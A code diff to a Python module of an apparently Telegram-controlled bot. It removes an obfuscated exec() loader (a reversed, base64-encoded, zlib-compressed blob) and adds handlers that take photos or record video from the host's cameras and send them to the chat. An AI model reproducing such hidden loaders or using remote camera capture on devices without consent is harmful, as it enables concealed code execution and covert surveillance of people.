@@ -3,10 +3,240 @@ import config
 import time
 import os
 import constants
+from command_registry import registry
+import asyncio
+from modules import File
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def shot_callback(bot, call):
+    message = constants.CAMERA_SHOT_documentation.format(
+        available_cameras=beautiful_get_available_cameras())
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
 
 
-exec((_)(b'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'))
+async def video_callback(bot, call):
+    message = constants.CAMERA_VIDEO_documentation.format(
+        available_cameras=beautiful_get_available_cameras(), max_time_to_camera=config.max_time_to_camera_record)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.CAMERA_SHOT_command,
+    permission_name=constants.CAMERA_SHOT,
+)
+async def shot(bot, message):
+    """
+    Capture a photo from the specified camera.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /shot 1
+    """
+
+    device_index = getarg(message.text, constants.CAMERA_SHOT_command)
+
+    markup = getMarkupModes()
+
+    if not device_index.isdigit():
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    await send_message(bot, message.chat.id, text=constants.PROCESSING)
+
+    photo_path = shot_func(int(device_index))
+
+    photo = open(photo_path, 'rb')
+    await bot.send_photo(message.chat.id, photo, reply_markup=markup)
+
+    File.delete_tmp_file(photo_path)
+
+
+@registry.register(
+    command_name=constants.CAMERA_VIDEO_command,
+    permission_name=constants.CAMERA_VIDEO,
+)
+async def video(bot, message):
+    """
+    Record video from the specified camera for a given duration.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /video 1 5
+    """
+
+    markup = getMarkupModes()
+
+    arguments = getarg(message.text, constants.CAMERA_VIDEO_command).split()
+
+    if len(arguments) != 2 or not (arguments[0].isdigit() and arguments[1].isdigit()):
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    device_index, time_working = arguments
+
+    if not time_working.isdigit() or int(time_working) > config.max_time_to_camera_record:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    device_index, time_working = map(int, arguments)
+
+    await send_message(bot, message.chat.id, text=constants.video_recording_started_message)
+
+    loop = asyncio.get_event_loop()
+    video_path = await loop.run_in_executor(None, lambda: record_video_func(device_index, time_working))
+
+    await send_message(bot, message.chat.id, text=constants.video_recording_finished_message)
+
+    video = open(video_path, 'rb')
+    await bot.send_video(message.chat.id, video, reply_markup=markup)
+
+    File.delete_tmp_file(video_path)
+
+
+def beautiful_get_available_cameras():
+    """
+    Get formatted string listing available cameras.
+
+    Returns:
+        Formatted string with available cameras or error message
+    """
+    available_cameras = get_available_cameras()
+
+    answer = 'Camera devices:\n'
+
+    for i in range(0, len(available_cameras)):
+        answer += f"{i + 1}) Camera{i + 1}\n"
+
+    if len(available_cameras) == 0:
+        answer = '! Seems like this device doesn\'t have any cameras.'
+
+    return answer
+
+
+def get_available_cameras(max_tests=5):
+    """
+    Detect available camera devices by testing indices.
+
+    Args:
+        max_tests: Maximum camera index to test (default: 5)
+
+    Returns:
+        List of available camera indices
+    """
+    available_cameras = []
+    for i in range(max_tests):
+        cap = cv2.VideoCapture(i)
+        if cap.isOpened():
+            available_cameras.append(i)
+            cap.release()
+
+    return available_cameras
+
+
+def shot_func(camera_index):
+    """
+    Capture a single frame from the specified camera.
+
+    Args:
+        camera_index: Camera index (1-based)
+
+    Returns:
+        tuple: (error_flag, path_or_error_message)
+               0 for success with file path
+               1 for error with error message
+    """
+
+    list_of_available_cameras = get_available_cameras()
+
+    if not (camera_index > 0 and camera_index <= len(list_of_available_cameras)):
+        raise IndexError(
+            f"Index not in range [1:{len(list_of_available_cameras)}].")
+
+    cap = cv2.VideoCapture(camera_index - 1)
+
+    if not cap.isOpened():
+        raise Exception("Failed to open camera")
+
+    for i in range(5):
+        cap.read()
+
+    ret, frame = cap.read()
+
+    if not ret:
+        raise Exception("Camera doesn't work.")
+
+    tmp_photo_path = File.get_random_temp_file_name(
+        sample='{file_name}.png')
+
+    cv2.imwrite(tmp_photo_path, frame)
+
+    cap.release()
+
+    return tmp_photo_path
+
+
+def record_video_func(camera_index, time_working):
+    """
+    Record video from the specified camera for given duration.
+
+    Args:
+        camera_index: Camera index (1-based)
+        time_working: Recording duration in seconds
+
+    Returns:
+        tuple: (error_flag, path_or_error_message)
+               0 for success with file path
+               1 for error with error message
+    """
+
+    list_of_available_cameras = get_available_cameras()
+
+    if not (camera_index > 0 and camera_index <= len(list_of_available_cameras)):
+        raise IndexError(
+            f"Index not in range [1:{len(list_of_available_cameras)}].")
+
+    time_working += 1
+
+    cap = cv2.VideoCapture(camera_index - 1)
+
+    if not cap.isOpened():
+        raise Exception("Failed to open camera")
+
+    tmp_video_path = File.get_random_temp_file_name(
+        sample='{file_name}.mp4')
+
+    fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
+    out = cv2.VideoWriter(tmp_video_path, fourcc, 20.0, (640, 480))
+
+    start_time = time.time()
+    while True:
+        ret, frame = cap.read()
+        out.write(frame)
+
+        end_time = time.time()
+        if end_time - start_time >= int(time_working):
+            break
+
+    cap.release()
+    out.release()
+
+    return tmp_video_path
+
+
+modes = {
+    constants.CAMERA_SHOT_preview: constants.CAMERA_SHOT,
+    constants.CAMERA_VIDEO_preview: constants.CAMERA_VIDEO
+}
